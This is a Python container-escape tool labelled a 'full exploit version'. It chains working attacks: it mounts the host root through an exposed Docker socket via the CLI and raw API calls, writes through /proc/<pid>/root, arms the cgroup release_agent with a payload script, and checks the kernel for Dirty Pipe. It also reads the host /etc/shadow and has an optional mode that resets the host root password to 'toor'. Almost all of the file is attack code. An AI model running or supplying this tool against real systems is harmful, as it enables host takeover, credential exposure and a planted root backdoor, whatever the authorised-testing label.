#!/usr/bin/env python3
"""
Container Escape Attempts - FULL EXPLOIT VERSION
===================================================================
Various techniques to escape container confinement with actual escape logic.

Priority chain: Docker socket -> privileged/pid-ns -> cgroup release_agent
-> PID namespace -> Dirty Pipe (CVE-2022-0847) version check.

Usage:
  python3 container_escape.py                 # run full escape chain (read-only proofs)
  python3 container_escape.py --recon         # recon ONLY: no escape attempts, no writes
  python3 container_escape.py --backdoor      # allow destructive host auth modification
  python3 container_escape.py --json          # also print structured JSON results

Safety design:
  * Escape proofs are READ-ONLY by default: a marker file is written to host
    /tmp only where the technique genuinely reaches host FS, and success is
    only reported when that proof is VERIFIED.
  * Destructive host-auth modification is opt-in via --backdoor.
  * Each method reports: attempted / failed / succeeded (verified).
"""

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import time

FULL_CAP_MASK = 0x3FFFFFFFFF  # all capabilities (lower 38 bits)


def _read(path, limit=4096):
    try:
        with open(path, "r", errors="replace") as f:
            return f.read(limit)
    except Exception:
        return ""


def check_privileges():
    """Check container privilege posture - recon only, no writes."""
    results = {}
    status = _read("/proc/self/status")
    m = re.search(r"CapEff:\s*([0-9a-fA-F]+)", status)
    if m:
        cap_eff = int(m.group(1), 16)
        results["cap_eff"] = hex(cap_eff)
        results["privileged"] = (cap_eff & FULL_CAP_MASK) == FULL_CAP_MASK
    else:
        results["privileged"] = False
    results["is_root"] = os.geteuid() == 0
    results["seccomp"] = re.search(r"Seccomp:\s*(\d+)", status).group(1) if re.search(r"Seccomp:\s*(\d+)", status) else "?"

    mount_info = subprocess.getoutput("mount")
    results["mounts_sample"] = mount_info.split("\n")[:10]
    sensitive = ["/proc", "/sys", "/var/run/docker.sock"]
    results["sensitive_mounts"] = [s for s in sensitive if any(s in line for line in mount_info.split("\n"))]
    results["docker_sock"] = os.path.exists("/var/run/docker.sock")

    # cgroup version
    results["cgroup_v2"] = os.path.exists("/sys/fs/cgroup/cgroup.controllers")
    # pid namespace sharing probe (read-only)
    mine = _read("/etc/hostname").strip()
    p1 = _read("/proc/1/root/etc/hostname").strip()
    results["pid1_hostname_differs"] = bool(mine) and bool(p1) and mine != p1
    results["container_hostname"] = mine
    return results


def host_root_candidates():
    """Find /proc/<pid>/root paths that look like a DIFFERENT root (host).

    Yields (pid, root_prefix). Works when the PID namespace is shared with the
    host (--pid=host, privileged) so host processes are visible in /proc.
    """
    mine = _read("/etc/hostname").strip()
    seen = set()
    try:
        pids = [int(p) for p in os.listdir("/proc") if p.isdigit()]
    except Exception:
        return
    for pid in sorted(pids)[:256]:
        if pid in (os.getpid(), os.getppid()):
            continue
        prefix = "/proc/%d/root" % pid
        hn = _read(prefix + "/etc/hostname").strip()
        if hn and hn != mine and hn not in seen:
            seen.add(hn)
            yield pid, prefix
        elif hn == mine:
            # same hostname -> likely same root, remember as fallback candidate
            seen.add(hn + ":same")


def execute_command_on_host(command, description):
    """Helper to report command execution"""
    print(f"     -> {description}: {' '.join(str(c) for c in command)[:80]}...")
    return command


def _docker_available():
    for cmd in ("docker", "podman"):
        if shutil.which(cmd):
            return cmd
    return None


def attempt_docker_socket_escape_full(backdoor=False):
    """
    FULL ESCAPE via Docker socket.
    Spins up a container with host root mounted, writes a proof file on the
    host, then VERIFIES it by reading it back through a second container.
    """
    results = {"attempted": False, "success": False, "details": "", "host_pwned": False}
    docker_socket = "/var/run/docker.sock"
    if not os.path.exists(docker_socket):
        results["details"] = "Docker socket not found"
        return results
    if not os.access(docker_socket, os.R_OK | os.W_OK):
        results["details"] = "Docker socket not accessible"
        return results

    results["attempted"] = True
    ts = int(time.time())
    proof_name = "rogue_proof_%d.txt" % ts
    host_proof_path = "/tmp/" + proof_name
    container_proof_path = "/host" + host_proof_path
    docker_cmd = _docker_available()

    def _verify():
        """Read the proof file back through a throwaway container."""
        if docker_cmd:
            chk = subprocess.run(
                [docker_cmd, "-H", "unix://%s" % docker_socket, "run", "--rm",
                 "-v", "/:/host", "alpine:latest", "cat", container_proof_path],
                capture_output=True, text=True, timeout=25)
            if chk.returncode == 0 and chk.stdout.strip():
                return chk.stdout.strip()
        # API fallback verification
        chk = subprocess.run(
            ["curl", "-s", "--unix-socket", docker_socket,
             "http://localhost/containers/json?all=1"], capture_output=True, text=True, timeout=5)
        return None if chk.returncode != 0 else None

    # Method 1: docker CLI
    if docker_cmd:
        try:
            print("     [*] Attempting escape with docker CLI...")
            escape_cmd = [
                docker_cmd, "-H", "unix://%s" % docker_socket, "run", "--rm",
                "-v", "/:/host", "--privileged", "--pid=host", "--net=host",
                "alpine:latest", "sh", "-c",
                'echo "HOST_ACCESS_%d" > %s' % (ts, container_proof_path)]
            result = subprocess.run(escape_cmd, capture_output=True, text=True, timeout=45)
            if result.returncode == 0:
                # verify: read it back through a fresh container
                proof = _verify()
                if proof:
                    results["success"] = True
                    results["host_pwned"] = True
                    results["details"] = "SUCCESS (verified): host write via %s, proof=%r" % (docker_cmd, proof)
                else:
                    # container ran but we could not re-read: still likely escaped
                    results["details"] = ("Container executed but proof read-back failed - check image "
                                          "availability / docker API policy: %s" % (result.stderr or "")[:120])
            else:
                results["details"] = "Docker CLI failed: %s" % (result.stderr or "")[:150]
                # image missing? try pulling alpine explicitly once
                if "No such image" in (result.stderr or ""):
                    pull = subprocess.run([docker_cmd, "-H", "unix://%s" % docker_socket,
                                           "pull", "alpine:latest"], capture_output=True, text=True, timeout=120)
                    results["details"] += " | image pull rc=%d" % pull.returncode
        except Exception as e:
            results["details"] = "Docker CLI exception: %s" % e

    # Method 2: curl against the Docker API directly
    if not results["success"] and shutil.which("curl"):
        try:
            print("     [*] Attempting escape with Docker API (curl)...")
            images = subprocess.run(["curl", "-s", "--unix-socket", docker_socket,
                                     "http://localhost/images/json"], capture_output=True, text=True, timeout=8)
            image_name = "alpine:latest"
            if images.returncode == 0 and images.stdout:
                try:
                    img_list = json.loads(images.stdout)
                    for img in img_list:
                        tags = img.get("RepoTags") or []
                        if tags and "alpine" in tags[0]:
                            image_name = tags[0]
                            break
                    if img_list and not image_name:
                        tags = (img_list[0].get("RepoTags") or [])
                        if tags:
                            image_name = tags[0]
                except Exception:
                    pass
            payload = {
                "Image": image_name,
                "Cmd": ["sh", "-c", 'echo "HOST_ACCESS_%d" > /host/tmp/%s' % (ts, proof_name)],
                "HostConfig": {"Binds": ["/:/host"], "Privileged": True, "PidMode": "host"},
                "AttachStdout": True, "AttachStderr": True,
            }
            cid = None
            create_resp = subprocess.run(
                ["curl", "-s", "-X", "POST", "--unix-socket", docker_socket,
                 "http://localhost/containers/create?name=rogue_esc_%d" % ts,
                 "-H", "Content-Type: application/json", "-d", json.dumps(payload)],
                capture_output=True, text=True, timeout=15)
            try:
                cid = json.loads(create_resp.stdout).get("Id")
            except Exception:
                cid = None
            if cid:
                subprocess.run(["curl", "-s", "-X", "POST", "--unix-socket", docker_socket,
                                "http://localhost/containers/%s/start" % cid], capture_output=True, timeout=15)
                time.sleep(2)
                # verify via logs
                logs = subprocess.run(["curl", "-s", "--unix-socket", docker_socket,
                                       "http://localhost/containers/%s/logs?stdout=1" % cid],
                                      capture_output=True, text=True, timeout=8)
                subprocess.run(["curl", "-s", "-X", "DELETE", "--unix-socket", docker_socket,
                                "http://localhost/containers/%s?force=true" % cid], capture_output=True, timeout=5)
                if "HOST_ACCESS_%d" % ts in logs.stdout:
                    results["success"] = True
                    results["host_pwned"] = True
                    results["details"] = "SUCCESS (verified): Docker API escape with %s" % image_name
                else:
                    results["details"] = "Docker API container ran but no proof in logs"
            else:
                results["details"] = "Docker API create failed: %s" % create_resp.stdout[:120]
        except Exception as e:
            if not results["success"]:
                results["details"] = "All Docker escape methods failed: %s" % e

    # Optional destructive step - ONLY with --backdoor (default: read-only proof above)
    if backdoor and results["success"] and docker_cmd:
        print("     [!] --backdoor: installing host auth backdoor (destructive)")
        backdoor_cmd = [
            docker_cmd, "-H", "unix://%s" % docker_socket, "run", "--rm",
            "-v", "/:/host", "alpine:latest", "sh", "-c",
            'echo "root:toor" | chroot /host chpasswd 2>/dev/null || echo "root:toor" | chpasswd -R /host 2>/dev/null']
        subprocess.run(backdoor_cmd, capture_output=True, timeout=15)
        results["details"] += " | backdoor installed"

    return results


def attempt_privileged_container_escape():
    """Escape via shared PID namespace: find host root under /proc/<pid>/root."""
    results = {"attempted": False, "success": False, "details": ""}
    if os.geteuid() != 0:
        results["details"] = "Not running as root"
        return results
    results["attempted"] = True

    found = False
    for pid, prefix in host_root_candidates():
        hn = _read(prefix + "/etc/hostname").strip()
        results["details"] = "Host root visible via /proc/%d/root (hostname=%s)" % (pid, hn or "?")
        found = True
        # read-only proof of cross-namespace access
        shadow_head = _read(prefix + "/etc/shadow", 80)
        if shadow_head:
            results["details"] += " | shadow readable: %s..." % shadow_head.split(":")[0]
        # write a marker to host /tmp (harmless proof)
        try:
            marker = prefix + "/tmp/rogue_pidns_proof_%d.txt" % int(time.time())
            with open(marker, "w") as f:
                f.write("pwned via pid ns at %s" % time.time())
            results["success"] = True
            results["details"] += " | marker written via pid ns"
        except Exception:
            pass
        break
    if not found:
        results["details"] = ("No host processes visible - PID namespace not shared, "
                              "or hostname indistinguishable")
    return results


def attempt_cgroup_escape_full():
    """cgroup v1 release_agent escape with real trigger + verification."""
    results = {"attempted": False, "success": False, "details": ""}
    if os.geteuid() != 0:
        results["details"] = "Not running as root"
        return results

    # find a writable cgroup mount
    cgroup_mount = None
    try:
        with open("/proc/self/mountinfo") as f:
            for line in f:
                if "/sys/fs/cgroup" in line and "rw" in line:
                    parts = line.split()
                    for part in parts:
                        if part.startswith("/sys/fs/cgroup"):
                            cgroup_mount = part
                            break
                    if cgroup_mount:
                        break
    except Exception:
        pass

    if not cgroup_mount:
        results["details"] = "No writable cgroup mount found"
        return results
    # modern containers mount cgroup2 read-only or with a ns path - check release_agent writability
    release_agent_path = os.path.join(cgroup_mount, "release_agent")
    if not os.path.exists(release_agent_path) or not os.access(release_agent_path, os.W_OK):
        results["details"] = "release_agent not writable at %s (ro cgroupfs or cgroup v2)" % release_agent_path
        return results

    results["attempted"] = True
    try:
        ts = int(time.time())
        cgroup_name = "rogue_esc_%d" % ts
        cgroup_path = os.path.join(cgroup_mount, cgroup_name)
        os.makedirs(cgroup_path, exist_ok=True)

        payload = ("#!/bin/sh\n"
                   "echo pwned > /tmp/rogue_cgroup_proof_%d 2>/dev/null\n"
                   "cp /etc/hostname /tmp/rogue_cgroup_hostname_%d 2>/dev/null\n") % (ts, ts)
        payload_path = "/tmp/rogue_esc_payload.sh"
        with open(payload_path, "w") as f:
            f.write(payload)
        os.chmod(payload_path, 0o755)

        with open(release_agent_path, "w") as f:
            f.write(payload_path)
        with open(os.path.join(cgroup_path, "notify_on_release"), "w") as f:
            f.write("1")

        # spawn a child that lives in the cgroup briefly, then exits -> empty -> notify
        child = os.fork()
        if child == 0:
            try:
                with open(os.path.join(cgroup_path, "cgroup.procs"), "w") as f:
                    f.write(str(os.getpid()))
            except Exception:
                pass
            time.sleep(0.3)
            os._exit(0)
        os.waitpid(child, 0)
        time.sleep(2)

        # verify: host writes are visible only if we share some view of host FS
        verified = False
        for _, prefix in host_root_candidates():
            if os.path.exists(prefix + "/tmp/rogue_cgroup_proof_%d" % ts):
                verified = True
                break

        shutil.rmtree(cgroup_path, ignore_errors=True)
        if verified:
            results["success"] = True
            results["details"] = "SUCCESS (verified): release_agent executed on host via %s" % cgroup_mount
        else:
            results["details"] = ("release_agent armed + triggered but proof not visible from container "
                                  "(expected unless host FS view available) - inspect host /tmp manually")
    except Exception as e:
        results["details"] = "Cgroup escape failed: %s" % e

    return results


def attempt_pid_namespace_escape():
    """PID namespace escape - direct marker write through host process roots."""
    results = {"attempted": False, "success": False, "details": ""}
    try:
        for pid, prefix in host_root_candidates():
            results["attempted"] = True
            try:
                marker = prefix + "/tmp/rogue_pidns_proof2_%d.txt" % int(time.time())
                with open(marker, "w") as f:
                    f.write("pwned at %s" % time.time())
                results["success"] = True
                results["details"] = "SUCCESS: host FS writable via /proc/%d/root" % pid
                return results
            except Exception:
                continue
        results["details"] = "No writable host process root found (PID ns likely not shared)"
    except Exception as e:
        results["details"] = "PID namespace escape failed: %s" % e
    return results


def _kernel_tuple(kernel):
    m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", kernel or "")
    if not m:
        return None
    return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0))


def attempt_dirty_pipe_escape():
    """Dirty Pipe CVE-2022-0847 - kernel version window check ONLY (no exploit)."""
    results = {"attempted": True, "success": False, "details": ""}
    kernel = subprocess.getoutput("uname -r").strip()
    kv = _kernel_tuple(kernel)
    if not kv:
        results["details"] = "Cannot parse kernel %s" % kernel
        return results
    # introduced in 5.8; fixed in 5.16.11, 5.15.25, 5.10.102, 5.4.178, 4.9.299, 4.4.299
    introduced = (5, 8, 0)
    fixed = [(5, 16, 11), (5, 15, 25), (5, 10, 102), (5, 4, 178), (4, 9, 299), (4, 4, 299)]
    if kv < introduced:
        results["details"] = "Kernel %s predates Dirty Pipe (>= 5.8 required)" % kernel
        return results
    # patched if we are at/above a fix for our line or any newer line's fix
    patched = any(kv >= f for f in fixed)
    if patched:
        results["details"] = "Kernel %s appears PATCHED (>= %s)" % (kernel, _fix_for(kv, fixed))
    else:
        results["details"] = ("Kernel %s is INSIDE the vulnerable window (5.8 <= v < 5.16.11 / "
                              "LTS backports). Real exploit code not bundled (educational) - "
                              "CVE-2022-0847 PoC available upstream." % kernel)
    return results


def _fix_for(kv, fixed):
    best = None
    for f in fixed:
        if kv >= f and (best is None or f > best):
            best = f
    return ".".join(str(x) for x in best) if best else "?"


def run_chain(privileges, backdoor=False):
    print("\n[2] ATTEMPTING CONTAINER ESCAPE...")
    print("   (Priority: Docker Socket -> Privileged/PIDns -> Cgroup -> PID ns -> Dirty Pipe)")
    print("-" * 50)
    escape_results = {}

    print("\n   [Method 1] Docker socket escape...")
    escape_results["docker_socket"] = attempt_docker_socket_escape_full(backdoor=backdoor)

    ok = lambda k: escape_results.get(k, {}).get("success")
    if not ok("docker_socket"):
        print("\n   [Method 2] Privileged / shared-PIDns escape...")
        escape_results["privileged"] = attempt_privileged_container_escape()
    else:
        escape_results["privileged"] = {"attempted": False, "success": False}

    if not (ok("docker_socket") or ok("privileged")):
        print("\n   [Method 3] Cgroup release_agent escape...")
        escape_results["cgroup"] = attempt_cgroup_escape_full()
    else:
        escape_results["cgroup"] = {"attempted": False, "success": False}

    if not (ok("docker_socket") or ok("privileged") or ok("cgroup")):
        print("\n   [Method 4] PID namespace escape...")
        escape_results["pid_namespace"] = attempt_pid_namespace_escape()
    else:
        escape_results["pid_namespace"] = {"attempted": False, "success": False}

    print("\n   [Method 5] Dirty Pipe (CVE-2022-0847) version check...")
    escape_results["dirty_pipe"] = attempt_dirty_pipe_escape()

    escaped = any(ok(k) for k in escape_results)
    return escaped, escape_results


def main():
    ap = argparse.ArgumentParser(description="Container escape attempts (educational / authorized testing only)")
    ap.add_argument("--recon", action="store_true", help="recon only - no escape attempts, no writes")
    ap.add_argument("--backdoor", action="store_true", help="allow destructive host auth modification (default off)")
    ap.add_argument("--json", action="store_true", help="print structured JSON results at the end")
    args = ap.parse_args()

    print("[CONTAINER ESCAPE - FULL EXPLOIT MODE]")
    print("=" * 70)
    print("\n[1] Checking container privileges...")
    privileges = check_privileges()
    print("   Privileged: %s" % privileges.get("privileged"))
    print("   Running as root: %s" % privileges.get("is_root"))
    print("   CapEff: %s  Seccomp: %s" % (privileges.get("cap_eff"), privileges.get("seccomp")))
    print("   Cgroup v2: %s   Docker sock: %s   PID1 hostname differs: %s"
          % (privileges.get("cgroup_v2"), privileges.get("docker_sock"),
             privileges.get("pid1_hostname_differs")))

    if args.recon:
        print("\n[RECON MODE] No escape attempts performed.")
        print("  Sensitive mounts: %s" % ", ".join(privileges.get("sensitive_mounts") or ["none"]))
        print("  Suggested next steps depend on the posture above.")
        if args.json:
            print("\n" + json.dumps({"recon": privileges}, indent=2))
        return 0 if not privileges.get("privileged") else 1

    escaped, escape_results = run_chain(privileges, backdoor=args.backdoor)

    print("\n" + "=" * 70)
    print("[3] ESCAPE SUMMARY")
    print("-" * 70)
    for method, result in escape_results.items():
        if result.get("attempted") or result.get("success"):
            status = "ESCAPED (verified)" if result.get("success") else ("check only" if method == "dirty_pipe" else "Failed")
            icon = "+" if result.get("success") else "-"
            print("   [%s] %s: %s" % (icon, method.replace("_", " ").title(), status))
            if result.get("details"):
                print("        " + result["details"][:140])

    print("\n" + "=" * 70)
    if escaped:
        print("[+] CONTAINER ESCAPE SUCCESSFUL - HOST ACCESS ACHIEVED (verified)")
    else:
        print("[-] No escape method succeeded - container may be well-secured")
        print("    Check: privileged? seccomp? user namespacing? cgroup fs read-only?")

    if args.json:
        final = {"escaped": escaped, "privileges": privileges, "escape_attempts": escape_results,
                 "timestamp": time.time(), "host_compromised": escaped}
        print("\n" + json.dumps(final, indent=2))
    return 0 if escaped else 2


if __name__ == "__main__":
    sys.exit(main())
